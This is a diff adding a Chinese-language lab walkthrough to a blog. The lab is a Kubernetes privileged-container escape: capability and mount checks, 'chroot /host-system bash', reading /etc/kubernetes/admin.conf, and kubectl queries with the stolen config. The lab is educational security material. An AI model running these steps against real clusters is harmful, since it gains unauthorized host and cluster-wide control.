+<h2 id="3-4-Container-escape-to-the-host-system❓"><a href="#3-4-Container-escape-to-the-host-system❓" class="headerlink" title="3.4 Container escape to the host system❓"></a>3.4 Container escape to the host system❓</h2><p>通过Kubernetes 中的容器逃逸来访问宿主机系统。</p>
+<h3 id="3-4-1-场景介绍"><a href="#3-4-1-场景介绍" class="headerlink" title="3.4.1 场景介绍"></a>3.4.1 场景介绍</h3><p>这个场景展示了Kubernetes、容器环境和一般安全领域中常见的配置错误和一个容易出错的安全问题。不必要的特权总是会让安全性更差，在容器和Kubernetes的世界中尤其如此。根据集群环境和资源的配置和设置，还可以将此场景应用到容器之外的其他系统和服务。这个场景围绕一个特权容器逃逸来访问主机系统。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2015.03.12.png" style="zoom:40%;">
+
+<p>实践目的：</p>
+<p>1、能够利用容器并逃离docker容器。</p>
+<p>2、了解如何测试和利用配置错误的容器和特权容器。</p>
+<p>3、了解常见的错误配置以及它们对容器、Kubernetes和集群环境可能造成的破坏。</p>
+<p>大多数监控、追踪和调试软件运行时都需要额外的权限和能力。在这个场景中，将看到一个具备额外权限的Pod，其中包括HostPath访问权限，这将使你能够访问主机系统，并通过节点级配置实现对整个集群的完全控制。</p>
+<h3 id="3-4-2-场景访问"><a href="#3-4-2-场景访问" class="headerlink" title="3.4.2 场景访问"></a>3.4.2 场景访问</h3><p><code>http://192.168.52.13:1233/</code></p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2015.15.39.png" style="zoom:67%;">
+
+<p>目标：</p>
+<ul>
+<li>1）利用可用的错误配置逃逸出主机系统上正在运行的docker容器。</li>
+<li>2）使用主机系统级访问来获得其他资源访问，如果可能的话，甚至可以获取超越容器级、节点级和集群级的访问。</li>
+</ul>
+<blockquote>
+<p>TIP：访问主机系统并获得节点级别的kubeconfig文件/var/lib/kubelet/kubeconfig，并使用获得的配置查询Kubernetes节点。</p>
+</blockquote>
+<h3 id="3-4-3-实践"><a href="#3-4-3-实践" class="headerlink" title="3.4.3 实践"></a>3.4.3 实践</h3><ul>
+<li>信息分析（capsh –print、mount）</li>
+</ul>
+<blockquote>
+<h4 id="capsh"><a href="#capsh" class="headerlink" title="capsh"></a>capsh</h4><p><strong>Linux Capabilities</strong>：将 root 权限拆分为细粒度的能力，避免进程拥有不必要的特权</p>
+<p><code>capsh --print</code> 是一个用于查询当前进程的 <strong>capabilities（能力）</strong> 状态的命令。<code>capsh</code> 是 Linux 系统中的一个工具，属于 <code>libcap</code> 工具集的一部分，用于管理和调试进程的 capabilities。</p>
+<p>典型用途：</p>
+<ol>
+<li><strong>调试 capabilities</strong><br>检查进程是否具备某些特权能力（如 <code>cap_net_admin</code> 管理网络或 <code>cap_sys_admin</code> 执行系统管理操作）。</li>
+<li><strong>验证安全配置</strong><br>确认容器或沙箱环境的能力限制是否按预期生效（例如 Docker 默认丢弃部分能力）。</li>
+<li><strong>脚本中检查权限</strong><br>在脚本中判断当前用户/进程是否具备特定能力，而非依赖 root 身份。</li>
+</ol>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capsh <span class="token parameter variable">--print</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@system-monitor-deployment-d4cbb9957-q4hlf:/<span class="token comment"># capsh --print</span>
+Current: <span class="token operator">=</span>ep
+Bounding <span class="token builtin class-name">set</span> <span class="token operator">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Ambient <span class="token builtin class-name">set</span> <span class="token operator">=</span>
+Current IAB:
+Securebits: 00/0x0/1'b0 <span class="token punctuation">(</span>no-new-privs<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+ secure-noroot: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
+ secure-no-suid-fixup: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
+ secure-keep-caps: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
+ secure-no-ambient-raise: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+<span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+<span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+Guessed mode: HYBRID <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+root@system-monitor-deployment-d4cbb9957-q4hlf:/<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.00.10.png" style="zoom:50%;">
+
+<p>可以确定该容器具有主机系统的全部特权，并允许特权升级，以及/host-system被挂载。</p>
+<ul>
+<li>获取宿主机系统访问权限</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.01.25.png" style="zoom:40%;">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /host-system <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.18.39.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.26.16.png" style="zoom:50%;">
+
+<p>【执行失败】</p>
+<ul>
+<li>理想结果</li>
+</ul>
+<blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crictl pods
+ctr <span class="token parameter variable">-n</span> k8s.io containers list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.23.52.png" style="zoom:50%;">
+</blockquote>
+<ul>
+<li>k8s节点配置文件</li>
+</ul>
+<p>Kubernetes节点配置可以在默认路径中找到，节点级kubelet使用该路径与Kubernetes API Server通信。如果可以使用此配置，将获得与Kubernetes节点相同的特权。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/kubernetes/admin.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.28.52.png" style="zoom:50%;">
+
+<ul>
+<li>节点控制权</li>
+</ul>
+<p>可以使用可用的kubectl命令行实用程序使用获得的配置来探索其他资源。此外，还可以通过使用可用的实用程序或根据需要下载它们来利用许多其他潜在的功能。</p>
+<p>获得了节点的控制权之后可以开始进行横向移动和后渗透。</p>
+<p>获取节点信息：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token parameter variable">--kubeconfig</span> /etc/kubernetes/admin.conf get nodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.35.10.png" style="zoom:50%;">
+
+<p>可以看到它返回了可用的集群节点，因为我们拥有使用获得的配置查询Kubernetes API服务器的特权/权限。</p>
+<p>获取节点资源：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token parameter variable">--kubeconfig</span> /etc/kubernetes/admin.conf get all <span class="token parameter variable">-n</span> kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.31.24.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.32.52.png" style="zoom:50%;">
+
+
+
+
+
+
+
 
                 
             </div>
@@ -1688,7 +1943,7 @@ sysfs on /sys <span class="token builtin class-name">type</span> sysfs <span cla
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">358.6k</span>
+                        class="white-color">363.6k</span>
             
             
             
